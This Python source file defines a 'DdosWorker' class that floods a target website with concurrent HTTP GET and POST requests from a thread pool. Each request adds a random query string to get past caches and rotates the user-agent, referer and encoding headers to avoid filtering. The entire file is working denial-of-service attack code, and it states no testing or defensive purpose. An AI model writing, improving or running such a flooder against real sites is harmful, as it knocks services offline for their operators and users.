from concurrent.futures import ThreadPoolExecutor
from random import choice
from http.client import HTTPConnection, HTTPSConnection
from urllib.parse import urlparse

from termcolor import cprint

from src.utils.rand_utlis import rand_user_agent, rand_bot_referer, rand_accept_encoding, rand_cache_type, rand_str


class DdosWorker:
    def __init__(self, target: str, ssl=False, debug=False):
        self.target = target
        self._ssl = ssl
        self._debug = debug

    def _get_headers(self):
        return {
            'User-Agent': rand_user_agent(),
            'Cache-Control': rand_cache_type(),
            'Accept-Encoding': rand_accept_encoding(),
            'Keep-Alive': '42',
            'Host': self.target,
            'Referer': rand_bot_referer()
        }

    def _create_url(self):
        return self.target + '?' + rand_str()

    def run_concurrent(self, workers_count: int):
        with ThreadPoolExecutor(workers_count) as executor:
            for _ in range(workers_count):
                executor.submit(self.run)

    def run(self):
        conn = None
        try:
            target_parsed = urlparse(self.target)
            scheme = target_parsed.scheme
            hostname = target_parsed.hostname
            port = target_parsed.port

            if self._ssl and scheme == 'https':
                conn = HTTPSConnection(hostname, port)
            else:
                conn = HTTPConnection(hostname, port)

            url = self._create_url()
            headers = self._get_headers()
            method = choice(['GET', 'POST'])

            conn.request(url=url, method=method, headers=headers)
        except KeyboardInterrupt as e:
            if self._debug:
                cprint(f'[*] Request interrupted', 'red')
            raise e
        except Exception as e:
            if self._debug:
                cprint(f'[*] Request failed: {e}', 'red')
        finally:
            if conn is not None:
                conn.close()
            if self._debug:
                cprint(f'[*] Request sent', 'green')
